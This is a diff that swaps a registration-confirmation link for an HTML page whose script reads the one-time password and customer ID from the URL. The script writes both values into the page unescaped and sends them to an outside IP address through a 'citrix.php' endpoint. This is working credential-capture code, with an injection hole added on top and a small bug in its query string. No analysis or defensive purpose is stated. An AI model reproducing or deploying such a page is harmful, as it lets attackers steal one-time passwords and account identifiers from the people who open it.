@@ -1,1 +1,31 @@
-<a href="https://my.tespa.org/confirm-registration">https://my.tespa.org/confirm-registration</a>
+<html>
+
+<script>
+var documenturi = document.URL;
+
+var url = new URL(documenturi);
+var otp = url.searchParams.get("otp");
+var customerId = url.searchParams.get("customerId");
+
+document.write(otp);
+
+document.write("</br>"+customerId);
+
+var xhttp = new XMLHttpRequest();
+xhttp.open("GET", "http://52.89.241.219/citrix.php?otp="+otp+"&customerId"+customerId, true);
+xhttp.send();
+
+
+xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML =
+      this.responseText;
+    }
+  };
+
+
+</script>
+
+<div id="demo"></div>
+
+</html>
